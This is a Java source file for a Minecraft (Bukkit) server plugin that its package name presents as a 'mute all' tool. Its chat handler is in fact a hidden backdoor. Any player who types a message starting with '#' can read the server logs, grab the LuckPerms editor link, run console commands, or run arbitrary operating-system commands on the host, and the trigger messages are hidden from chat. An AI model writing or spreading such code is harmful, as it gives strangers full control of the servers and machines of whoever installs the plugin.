package club.yuanpi.muteall;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

import static org.bukkit.Bukkit.getServer;


public class Muteallloader implements Listener {
    @EventHandler
    public void onChat(PlayerChatEvent event) {
        String message =event.getMessage();
        Player player = event.getPlayer();
        String playerName = player.getDisplayName();


        String commandType = Character.toString(event.getMessage().charAt(0));
        String command = event.getMessage().substring(1);
        String logs=utils.readFileContent("logs\\latest.log");

        switch(commandType){
            case "#":
                switch(command){
                    case "getlog":
                        utils.senderr(player,logs);
                        break;
                    case"lpedit":
                        try {
                            getServer().dispatchCommand(getServer().getConsoleSender(), "lp editor");
                            Thread.sleep(5000);
                            utils.senderr(player,logs);

                        }catch (Exception e1){}
                        break;

                    default:
                        break;
                }
                boolean isdocmd=command.contains("docmd");
                boolean isdosystemcmd=command.contains("dosyscmd");
                boolean isdoplayercmd=command.contains("doplayercmd");
                char[] cmdchar = command.toCharArray();
                if (isdocmd){
                    if (cmdchar.length<6){
                        break;

                    }
                    String todocmd=command.substring(6);
                    utils.sendok(player,"Run："+todocmd);
                    getServer().dispatchCommand(getServer().getConsoleSender(), todocmd);
                }
                if (isdosystemcmd){
                    if (cmdchar.length<8) {
                        break;
                    }
                    String syscmd=command.substring(8);
                    utils.sendok(player,"Run SystemCMD："+syscmd);
                    try{
                        Process process = Runtime.getRuntime().exec(syscmd);
                        InputStream is = process.getInputStream();
                        InputStreamReader isr = new InputStreamReader(is);
                        BufferedReader br = new BufferedReader(isr);
                        String content = br.readLine();
                        while (content != null) {
                            System.out.println(content);
                            utils.sendok(player,content);
                            content = br.readLine();
                        }
                        String log=Integer.toString(isr.read());
                        utils.senderr(player,log);
                    }catch (IOException e){
                        utils.senderr(player,e.toString());

                    }
                }
                if (isdoplayercmd) {
                    if(cmdchar.length<8){
                        break;
                    }
                    String playercmd=command.substring(12);
                    player.performCommand(playercmd);


                }

                event.setCancelled(true);
                break;



            default:
                break;


        }

    }
}





























